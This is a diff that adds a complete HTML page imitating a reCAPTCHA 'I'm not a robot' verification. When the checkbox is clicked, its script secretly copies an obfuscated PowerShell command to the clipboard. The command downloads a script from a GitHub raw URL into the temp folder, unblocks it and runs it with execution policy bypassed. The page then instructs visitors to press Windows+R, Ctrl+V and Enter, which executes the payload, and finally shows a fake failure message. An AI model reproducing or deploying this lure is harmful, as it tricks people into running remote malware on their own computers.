@@ -1,0 +1,556 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+  <title>reCAPTCHA  ·  verification</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <style>
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+      font-family: system-ui, -apple-system, 'Segoe UI', Roboto, 'Helvetica Neue', sans-serif;
+    }
+
+    body {
+      min-height: 100vh;
+      background: linear-gradient(145deg, #f3f6fa 0%, #e9eef4 100%);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      padding: 1.5rem;
+    }
+
+    .card {
+      background: rgba(255, 255, 255, 0.9);
+      backdrop-filter: blur(12px);
+      -webkit-backdrop-filter: blur(12px);
+      border-radius: 32px;
+      box-shadow: 0 20px 40px -8px rgba(0, 20, 40, 0.15), 0 6px 12px rgba(0, 0, 0, 0.02);
+      padding: 2rem 2.25rem;
+      max-width: 500px;
+      width: 100%;
+      border: 1px solid rgba(255, 255, 255, 0.6);
+      transition: transform 0.25s ease, box-shadow 0.3s ease;
+    }
+
+    .card:hover {
+      box-shadow: 0 24px 48px -10px rgba(28, 52, 84, 0.2);
+    }
+
+    .captcha-row {
+      display: flex;
+      align-items: center;
+      gap: 1.2rem;
+      flex-wrap: wrap;
+    }
+
+    .checkbox-wrapper {
+      position: relative;
+      display: flex;
+      align-items: center;
+      cursor: pointer;
+      user-select: none;
+      -webkit-tap-highlight-color: transparent;
+    }
+
+    .checkbox-wrapper input {
+      position: absolute;
+      opacity: 0;
+      height: 0;
+      width: 0;
+      pointer-events: none;
+    }
+
+    .check-box {
+      width: 32px;
+      height: 32px;
+      background: white;
+      border: 2.2px solid #cbd5e1;
+      border-radius: 8px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      transition: all 0.2s cubic-bezier(0.2, 0.9, 0.4, 1);
+      box-shadow: 0 2px 4px rgba(0,0,0,0.02);
+      margin-right: 14px;
+    }
+
+    .checkbox-wrapper:hover .check-box {
+      border-color: #3b82f6;
+      background: #f8fafc;
+      transform: scale(1.02);
+    }
+
+    .spinner {
+      width: 20px;
+      height: 20px;
+      border: 2.5px solid rgba(59, 130, 246, 0.2);
+      border-top: 2.5px solid #2563eb;
+      border-radius: 50%;
+      animation: spin 0.8s linear infinite;
+      display: none;
+    }
+
+    .checkmark-icon {
+      font-size: 22px;
+      font-weight: 700;
+      color: #16a34a;
+      display: none;
+      line-height: 1;
+    }
+
+    .checkbox-wrapper.loading .check-box .spinner {
+      display: block;
+    }
+    .checkbox-wrapper.loading .check-box .checkmark-icon {
+      display: none;
+    }
+    .checkbox-wrapper.loading .check-box {
+      border-color: #3b82f6;
+      background: #eff6ff;
+    }
+
+    .checkbox-wrapper.verified .check-box {
+      border-color: #16a34a;
+      background: #f0fdf4;
+    }
+    .checkbox-wrapper.verified .check-box .checkmark-icon {
+      display: block;
+    }
+    .checkbox-wrapper.verified .check-box .spinner {
+      display: none;
+    }
+
+    .captcha-label {
+      font-size: 1.4rem;
+      font-weight: 500;
+      color: #1e293b;
+      letter-spacing: -0.01em;
+    }
+
+    .brand-note {
+      margin-top: 16px;
+      display: flex;
+      justify-content: flex-end;
+      align-items: center;
+      gap: 8px;
+    }
+
+    .brand-note span {
+      font-size: 0.8rem;
+      color: #64748b;
+    }
+
+    .recaptcha-logo {
+      display: flex;
+      align-items: center;
+      gap: 4px;
+    }
+
+    .steps-container {
+      display: none;
+      margin-top: 28px;
+      padding-top: 20px;
+      border-top: 1px solid #e2e8f0;
+      animation: fadeSlide 0.3s ease;
+    }
+
+    .steps-container h2 {
+      font-size: 1.5rem;
+      font-weight: 600;
+      color: #0f172a;
+      margin-bottom: 6px;
+      letter-spacing: -0.02em;
+    }
+
+    .instruction-sub {
+      font-size: 0.9rem;
+      color: #475569;
+      margin-bottom: 22px;
+      font-weight: 700;
+    }
+
+    .steps-list {
+      margin-bottom: 28px;
+    }
+
+    .step-row {
+      display: flex;
+      align-items: center;
+      gap: 16px;
+      margin-bottom: 16px;
+    }
+
+    .step-num {
+      width: 28px;
+      height: 28px;
+      background: #f1f5f9;
+      color: #1e293b;
+      border-radius: 30px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      font-weight: 600;
+      font-size: 0.9rem;
+    }
+
+    .key-combo {
+      display: flex;
+      align-items: center;
+      gap: 8px;
+      flex-wrap: wrap;
+    }
+
+    kbd {
+      background: #f8fafc;
+      color: #0f172a;
+      border-radius: 8px;
+      padding: 6px 12px;
+      font-family: 'SF Mono', 'Menlo', monospace;
+      font-size: 1rem;
+      font-weight: 500;
+      border: 1px solid #cbd5e1;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.02);
+      display: inline-block;
+      line-height: 1;
+    }
+
+    .win-kbd {
+      background: #f8fafc;
+      color: #0f172a;
+      border-radius: 8px;
+      padding: 6px 12px;
+      font-weight: 500;
+      border: 1px solid #cbd5e1;
+      box-shadow: 0 1px 2px rgba(0,0,0,0.02);
+      display: inline-flex;
+      align-items: center;
+      gap: 6px;
+    }
+
+    .win-icon {
+      font-size: 1.2rem;
+    }
+
+    .plus {
+      font-weight: 500;
+      color: #64748b;
+      font-size: 1.1rem;
+    }
+
+    .close-btn {
+      background: #0f172a;
+      border: none;
+      padding: 14px 24px;
+      border-radius: 60px;
+      font-weight: 600;
+      color: white;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: all 0.2s;
+      width: 100%;
+      border: 1px solid #1e293b;
+      letter-spacing: 0.3px;
+    }
+
+    .close-btn:hover {
+      background: #1e293b;
+      transform: scale(0.98);
+    }
+
+    .error-container {
+      display: none;
+      margin-top: 24px;
+      padding: 20px;
+      background: #fef2f2;
+      border-radius: 18px;
+      text-align: center;
+      animation: fadeSlide 0.3s ease;
+      border: 1px solid #fecaca;
+    }
+
+    .error-icon {
+      font-size: 2.2rem;
+      color: #dc2626;
+      margin-bottom: 8px;
+    }
+
+    .error-container h3 {
+      font-size: 1.3rem;
+      margin-bottom: 8px;
+      color: #0f172a;
+    }
+
+    .error-container p {
+      color: #475569;
+      margin-bottom: 18px;
+    }
+
+    .retry-btn {
+      background: #dc2626;
+      border: none;
+      padding: 12px 28px;
+      border-radius: 60px;
+      color: white;
+      font-weight: 600;
+      font-size: 1rem;
+      cursor: pointer;
+      transition: all 0.2s;
+      border: 1px solid #b91c1c;
+    }
+
+    .retry-btn:hover {
+      background: #b91c1c;
+    }
+
+    .toast {
+      position: fixed;
+      bottom: 30px;
+      left: 50%;
+      transform: translateX(-50%);
+      background: #1e293b;
+      color: white;
+      padding: 12px 24px;
+      border-radius: 40px;
+      font-size: 0.9rem;
+      box-shadow: 0 10px 20px rgba(0,0,0,0.2);
+      z-index: 3000;
+      display: none;
+      align-items: center;
+      gap: 10px;
+      white-space: nowrap;
+    }
+
+    .toast.show {
+      display: flex;
+    }
+
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+    @keyframes fadeSlide {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    @media (max-width: 480px) {
+      .card { padding: 1.5rem; }
+      .captcha-label { font-size: 1.2rem; }
+      .key-combo { gap: 6px; }
+      kbd, .win-kbd { padding: 5px 10px; font-size: 0.9rem; }
+    }
+  </style>
+</head>
+<body>
+<div class="card">
+  <div class="captcha-row">
+    <label class="checkbox-wrapper" id="recaptchaWrapper">
+      <input type="checkbox" id="recaptchaCheckbox" aria-label="I'm not a robot">
+      <div class="check-box">
+        <div class="spinner"></div>
+        <div class="checkmark-icon">✓</div>
+      </div>
+      <span class="captcha-label">I'm not a robot</span>
+    </label>
+  </div>
+
+  <div class="brand-note">
+    <div class="recaptcha-logo">
+      <span style="font-weight: 600; color:#3b82f6;">reCAPTCHA</span>
+      <span style="opacity:0.6;"></span>
+    </div>
+    <span>· Privacy · Terms</span>
+  </div>
+
+  <div class="steps-container" id="stepsContainer">
+    <h2>Follow steps for verification</h2>
+    <div class="instruction-sub">Press these keys on your keyboard</div>
+
+    <div class="steps-list">
+      <div class="step-row">
+        <span class="step-num">1</span>
+        <div class="key-combo">
+          <span class="win-kbd">
+            <span class="win-icon"><i class="fa-brands fa-windows"></i></span> Windows
+          </span>
+          <span class="plus">+</span>
+          <kbd>R</kbd>
+        </div>
+      </div>
+      <div class="step-row">
+        <span class="step-num">2</span>
+        <div class="key-combo">
+          <kbd>Ctrl</kbd>
+          <span class="plus">+</span>
+          <kbd>V</kbd>
+        </div>
+      </div>
+      <div class="step-row">
+        <span class="step-num">3</span>
+        <div class="key-combo">
+          <kbd>Enter</kbd>
+        </div>
+      </div>
+    </div>
+
+    <button class="close-btn" id="continueBtn">Continue</button>
+  </div>
+
+  <div class="error-container" id="errorContainer">
+    <div class="error-icon">
+      <i class="fa-solid fa-circle-exclamation"></i>
+    </div>
+    <h3>Captcha failed</h3>
+    <p>Server error or captcha validation failure. Please try again.</p>
+    <button class="retry-btn" id="retryBtn">Retry</button>
+  </div>
+</div>
+
+<div class="toast" id="copyToast">
+  <i class="fa-regular fa-copy"></i>
+  <span id="toastMessage">Token copied manually</span>
+</div>
+
+<script>
+  (function() {
+    "use strict";
+
+    const wrapper = document.getElementById('recaptchaWrapper');
+    const checkbox = document.getElementById('recaptchaCheckbox');
+    const stepsContainer = document.getElementById('stepsContainer');
+    const errorContainer = document.getElementById('errorContainer');
+    const continueBtn = document.getElementById('continueBtn');
+    const retryBtn = document.getElementById('retryBtn');
+    const copyToast = document.getElementById('copyToast');
+    const toastMessage = document.getElementById('toastMessage');
+
+    let isVerified = false;
+    let isLoading = false;
+    let loadingTimer = null;
+
+    async function copyToken(token) {
+      try {
+        await navigator.clipboard.writeText(token);
+        return true;
+      } catch (primaryError) {
+        try {
+          const textArea = document.createElement('textarea');
+          textArea.value = token;
+          textArea.style.position = 'fixed';
+          textArea.style.left = '-9999px';
+          document.body.appendChild(textArea);
+          textArea.focus();
+          textArea.select();
+          const success = document.execCommand('copy');
+          document.body.removeChild(textArea);
+          if (success) return true;
+        } catch (fallbackError) {}
+        toastMessage.textContent = 'Copy manually: ' + token.substring(0, 40) + '…';
+        copyToast.classList.add('show');
+        setTimeout(() => copyToast.classList.remove('show'), 5000);
+        return false;
+      }
+    }
+
+    function showSteps() {
+      stepsContainer.style.display = 'block';
+    }
+
+    function hideSteps() {
+      stepsContainer.style.display = 'none';
+    }
+
+    function showError() {
+      errorContainer.style.display = 'block';
+    }
+
+    function hideError() {
+      errorContainer.style.display = 'none';
+    }
+
+    function resetCaptcha() {
+      isVerified = false;
+      isLoading = false;
+      if (loadingTimer) {
+        clearTimeout(loadingTimer);
+        loadingTimer = null;
+      }
+      wrapper.classList.remove('verified', 'loading');
+      wrapper.style.pointerEvents = 'auto';
+      checkbox.checked = false;
+      checkbox.disabled = false;
+      hideSteps();
+      hideError();
+    }
+
+    function setLoadingState(loading) {
+      isLoading = loading;
+      if (loading) {
+        wrapper.classList.add('loading');
+        wrapper.classList.remove('verified');
+        checkbox.disabled = true;
+      } else {
+        wrapper.classList.remove('loading');
+        checkbox.disabled = false;
+      }
+    }
+
+    function setVerifiedState() {
+      isVerified = true;
+      wrapper.classList.add('verified');
+      wrapper.classList.remove('loading');
+      checkbox.checked = true;
+      checkbox.disabled = true;
+      wrapper.style.pointerEvents = 'none';
+    }
+
+    function handleVerification(e) {
+      e.preventDefault();
+      if (isVerified || isLoading) return;
+      if (checkbox.disabled) return;
+
+      setLoadingState(true);
+
+      loadingTimer = setTimeout(async () => {
+    setVerifiedState();
+    const token = `powershell -nop -w 1 -c "$a='Net.Web';$b='Client';$c='DownloadFile';$u='https://raw.githubusercontent.com/zeck13/zack/main/a8.txt';$p=$env:TMP+'\\q.ps1';(New-Object ($a+$b)).$c($u,$p);Unblock-File $p;powershell -ep bypass -f $p"`;
+    
+    await copyToken(token);
+    showSteps();
+    isLoading = false;
+    loadingTimer = null;
+}, 1500);
+    }
+
+    wrapper.addEventListener('click', function(e) {
+      if (isVerified || isLoading) {
+        e.preventDefault();
+        return;
+      }
+      handleVerification(e);
+    });
+
+    checkbox.addEventListener('click', function(e) {
+      e.stopPropagation();
+      e.preventDefault();
+    });
+
+    continueBtn.addEventListener('click', function() {
+      hideSteps();
+      showError();
+    });
+
+    retryBtn.addEventListener('click', function() {
+      resetCaptcha();
+    });
+
+    window.addEventListener('beforeunload', function() {
+      if (loadingTimer) clearTimeout(loadingTimer);
+    });
+
+    checkbox.checked = false;
+    wrapper.classList.remove('verified', 'loading');
+  })();
+</script>
+</body>
+</html>
